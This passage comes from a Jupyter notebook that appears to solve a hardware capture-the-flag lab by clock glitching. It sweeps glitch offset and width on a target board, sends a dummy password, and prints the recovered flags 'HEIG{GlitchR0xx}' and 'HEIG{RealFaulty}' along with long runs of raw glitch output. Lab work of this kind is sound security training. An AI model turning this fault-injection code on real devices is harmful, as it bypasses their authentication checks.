      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002501**00002499**00002499**00002501**00002499**00002501**00002499**00002499**00002499*\n",
      "*00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002501**00002501**00002499**00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002501**00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002501**00002499**00002499**00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002501**00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002501**00002499**00002499**00002499**00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002501**00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002501**00002499**00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499*\n",
      "Success rate: 743/1125 (66.04%)\n"
     ]
    }
   ],
   "source": [
    "offsets = np.arange(-25.6, -21.1, 0.1)\n",
    "widths = np.arange(35.7, 36.2, 0.1)\n",
    "get_info_on_glitch(offsets, widths)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "2267b1f4-0e63-4215-a3a6-031ab4ca6bd3",
   "metadata": {
    "tags": []
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "...........................................................................................................................................\n",
      "ext_offset 09\tWidth 35.70\tOffset -21.20\tResult 484549477b476c69746368523078787d\n",
      "HEIG{GlitchR0xx}\n",
      "............................................................\n",
      "9\n"
     ]
    }
   ],
   "source": [
    "\n",
    "# ext_offset is the number of clock cycles after the trigger\n",
    "for ext_offset in range(9,10):\n",
    "    scope.glitch.ext_offset = ext_offset\n",
    "    \n",
    "    # offset is the percentage into the clock cycle where the glitch starts\n",
    "    for offset in np.arange(-21.2, -21.1, 0.1): # TODO shorten range\n",
    "        scope.glitch.offset = offset\n",
    "        \n",
    "        # Width is the percentage of the period to glitch\n",
    "        for width in  np.arange(35.6, 35.7, 0.1): # TODO shorten range\n",
    "            scope.glitch.width = width\n",
    "\n",
    "\n",
    "            for _ in range(100):\n",
    "\n",
    "                #Fun starts here\n",
    "\n",
    "                target_reset()\n",
    "                scope.arm()\n",
    "                # Send dummy password\n",
    "                target.simpleserial_write(\"p\", b\"aaaaaaaaaaaaaaaa\")\n",
    "                ret = scope.capture()\n",
    "                #scope.io.vglitch_reset()\n",
    "\n",
    "                val = target.simpleserial_read_witherrors('r', 16, glitch_timeout=10, timeout=30)\n",
    "                if val['valid'] is False:\n",
    "                    print(\"X\", end=\"\")\n",
    "                    continue\n",
    "\n",
    "                result = val['payload']\n",
    "                if b\"NOPE\" not in result:\n",
    "                    print()\n",
    "                    print(f\"ext_offset {ext_offset:02d}\\tWidth {width:0.2f}\\tOffset {offset:0.2f}\\tResult {result.hex()}\")\n",
    "                    try:\n",
    "                        print(result.decode())\n",
    "                    except:\n",
    "                        pass\n",
    "\n",
    "                else:\n",
    "                    print(\".\", end=\"\")\n",
    "    print()\n",
    "    print(ext_offset)\n"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "id": "883c0fcc",
   "metadata": {},
   "source": [
    "HEIG{RealFaulty} => ext_offset 08, 15, 16, 24\n",
    "\n",
    "HEIG{GlitchR0xx}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c7fd38f8-58fb-4d47-9dd0-f552cf42de8e",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "scope.dis()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
